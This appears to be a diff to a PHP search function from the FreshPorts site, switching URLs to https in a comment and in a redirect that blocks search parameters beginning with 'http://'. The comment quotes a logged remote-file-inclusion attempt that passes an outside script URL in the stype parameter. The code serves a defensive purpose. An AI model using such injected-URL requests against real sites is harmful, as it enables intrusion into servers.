@@ -179,13 +179,13 @@ function WildCardQuery($stype, $Like, $query) {
 
 	# we have a problem with people doing this:
 	#
-	# 83.85.93.90 - - [02/Oct/2007:04:18:00 -0400] "GET /search.php?stype=http://amyru.h18.ru/images/cs.txt? HTTP/1.1" 301 332 "-" "Wget/1.1 (compatible; i486; Linux; RedHat7.3)"
+	# 83.85.93.90 - - [02/Oct/2007:04:18:00 -0400] "GET /search.php?stype=https://amyru.h18.ru/images/cs.txt? HTTP/1.1" 301 332 "-" "Wget/1.1 (compatible; i486; Linux; RedHat7.3)"
 	# well, it's not so much a problem as an annoyance.  So we will redirect their ass eslewhere.
 	#
 
 	if (substr($stype, 0, 7) === 'http://') {
 	  # redirect their ass
-	  header('Location: http://news.freshports.org/2007/10/02/odd-way-to-break-in/');
+	  header('Location: https://news.freshports.org/2007/10/02/odd-way-to-break-in/');
 	  exit;
 	}
 
